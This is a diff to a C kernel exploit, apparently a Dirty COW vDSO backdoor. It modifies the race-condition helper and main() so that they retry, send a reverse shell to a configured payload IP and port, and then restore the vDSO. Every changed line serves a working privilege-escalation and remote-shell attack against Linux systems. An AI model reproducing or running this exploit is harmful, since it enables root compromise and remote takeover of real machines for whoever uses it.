@@ -388,6 +388,7 @@ static int exploit_helper(struct mem_arg *arg)
 	pthread_t pth1, pth2;
 	int ret, status;
 	pid_t pid;
+	int i;
 
 	fprintf(stderr, "[*] %s: patch %d/%ld\n",
 		arg->do_patch ? "exploit" : "restore",
@@ -420,13 +421,15 @@ static int exploit_helper(struct mem_arg *arg)
 
 	/* check result */
 	ret = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
-	if (ret == 0) {
-		fprintf(stderr, "[*] vdso successfully %s\n",
-			arg->do_patch ? "backdoored" : "restored");
-	} else {
-		fprintf(stderr, "[-] failed to win race condition...\n");
+	for (i=0;i<10;i++) {	
+		if (ret == 0) {
+			fprintf(stderr, "[*] vdso successfully %s\n",
+				arg->do_patch ? "backdoored" : "restored");
+			return ret;
+		} else {
+			fprintf(stderr, "[-] failed to win race condition...\n");
+		}
 	}
-
 	return ret;
 }
 
@@ -632,6 +635,7 @@ int main(int argc, char *argv[])
 	uint16_t port;
 	uint32_t ip;
 	int s;
+	int i;
 
 	ip = htonl(PAYLOAD_IP);
 	port = htons(PAYLOAD_PORT);
@@ -661,16 +665,26 @@ int main(int argc, char *argv[])
 	if (build_vdso_patch(arg.vdso_addr, prologue) == -1)
 		return EXIT_FAILURE;
 
-	s = create_socket(port);
-	if (s == -1)
-		return EXIT_FAILURE;
+	//s = create_socket(port);
+	//if (s == -1)
+	//return EXIT_FAILURE;
 
 	if (exploit(&arg, true) == -1) {
 		fprintf(stderr, "exploit failed\n");
 		return EXIT_FAILURE;
 	}
-
-	yeah(&arg, s);
-
-	return EXIT_SUCCESS;
+	sleep(1);
+	fprintf(stderr, "[*] Remote shell sent to:%s:%d.\n",inet_ntoa(*(struct in_addr *)&ip), ntohs(port));
+	//yeah(&arg, s);
+	for (i=0;i<10;i++) {
+		if (exploit(&arg, false) != -1)	//try another restore
+			return EXIT_SUCCESS;
+		else {
+			fprintf(stderr, "[-] failed to restore vDSO\n");			
+			sleep(5);
+		}
+	}
+	fprintf(stderr, "[-] failed to restore vDSO - Exiting!\n");
+	exit(0);
+	
 }
